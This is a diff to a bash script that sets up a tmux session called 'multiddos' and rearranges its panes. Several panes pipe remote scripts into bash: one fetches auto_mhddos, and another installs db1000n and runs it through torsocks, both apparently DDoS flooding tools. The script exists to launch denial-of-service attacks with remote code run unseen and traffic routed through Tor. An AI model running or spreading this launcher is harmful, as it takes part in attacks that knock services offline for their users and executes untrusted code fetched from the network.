@@ -9,11 +9,11 @@ pip install --upgrade pip
 #sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
 #sudo apt install docker-ce -y
 
+tmux kill-session -t multiddos; sudo pkill node
 #tmux mouse support
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
 tmux source-file ~/.tmux.conf
 
-tmux kill-session -t multiddos; sudo pkill node
 cd ~
 rm -rf multiddos
 mkdir multiddos
@@ -26,11 +26,10 @@ fi
 
 tmux new-session -s multiddos -d 'gotop -asc solarized'
 sleep 0.1
-tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash'
+tmux split-window -v 'vnstat -l'
+sleep 0.1
+tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash'
 sleep 0.1
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
-tmux select-pane -t 0
-sleep 0.1
-tmux split-window -v 'vnstat -l'
 tmux -2 attach-session -d
